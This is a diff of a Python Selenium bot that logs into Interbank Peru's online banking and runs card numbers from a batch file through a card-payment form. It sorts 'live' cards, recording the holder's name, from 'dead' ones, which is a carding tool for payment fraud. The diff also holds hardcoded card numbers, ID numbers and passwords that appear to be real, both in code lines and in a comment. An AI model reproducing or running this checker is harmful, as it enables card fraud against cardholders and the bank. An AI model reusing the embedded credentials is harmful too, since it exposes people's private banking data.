@@ -7,6 +7,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import NoSuchElementException
 from selenium.webdriver.firefox.options import FirefoxProfile
+from printy import printy
 
 import time
 
@@ -76,22 +77,28 @@ class BotInterbank:
     def open(self):
         self.driver.get("https://bancaporinternet.interbank.pe/login")
         #time.sleep(1)
-        self.driver.find_element(By.XPATH, Xpath.numTarjeta).send_keys("4213550160330949")
-        self.driver.find_element(By.XPATH, Xpath.documentoDNI).send_keys("42240356")
+        self.driver.find_element(By.XPATH, Xpath.numTarjeta).send_keys("4213550149888272")
+        self.driver.find_element(By.XPATH, Xpath.documentoDNI).send_keys("80122534")
         self.driver.find_element(By.XPATH, Xpath.claveWeb).send_keys("1")
     
-        self.click_key('T')
+        self.click_key('P')
         self.click_caps_lock()
-        self.send_keys('panduro84')
+        self.send_keys('achon1213')
+        #4213550160330949,42240356,Tpanduro84
         
         self.driver.find_element(By.XPATH, Xpath.btnIngresar).click()
     def open_calarLives(self):
         wait0 = WebDriverWait(self.driver, 10)
         wait0.until(EC.visibility_of_element_located((By.XPATH, Xpath.rdbPagoTarjetaCredito)))
+        time.sleep(2)
         self.driver.find_element(By.XPATH, Xpath.rdbPagoTarjetaCredito).click()
+        time.sleep(1.5)
         self.driver.find_element(By.XPATH, Xpath.btnIniciarPago).click()
+        time.sleep(1.5)
         self.driver.find_element(By.XPATH, Xpath.TipoDeTarjeta).click()
+        time.sleep(1.5)
         self.driver.find_element(By.XPATH, Xpath.otraTarjetaInterbank).click()
+        time.sleep(1.5)
         
     def calarLives(self,tarjeta):
         wait0 = WebDriverWait(self.driver, 10)
@@ -148,18 +155,25 @@ if __name__ == '__main__':
 
     bot = BotInterbank(driver)
     bot.open_calarLives()
-
+    
     bot = BotInterbank(driver)
     def files():
+        contador = 0
         with open("lote.txt", "r", encoding="utf-8") as tarjetas, open("lives.txt", "a", encoding="utf-8") as archivo_lives:
             for tarjeta in tarjetas.readlines():
-                verify, destinatario = bot.calarLives(tarjeta.strip())
                 
+                registro = open("registro.txt","w")
+                registro.write(tarjeta.rstrip()) # escribir en el block
+                registro.write("\n")
+                registro.close()
+        
+                verify, destinatario = bot.calarLives(tarjeta.strip())
+                contador += 1
                 if verify:
-                    print(f"Tarjeta: {tarjeta.strip()} - - - > L I V E  |  {destinatario}")
+                    print(f"- [{contador}] / Tarjeta: {tarjeta.strip()} - - - > L I V E  |  {destinatario}","y")
                     archivo_lives.write(f"{tarjeta.strip()},{destinatario}\n")
                 else:  
-                    print(f"Tarjeta: {tarjeta.strip()} - - - > D E A T H ")
+                    printy(f"- [{contador}] / Tarjeta: {tarjeta.strip()} - - - > D E A T H ","cU")
                     
     files()
   
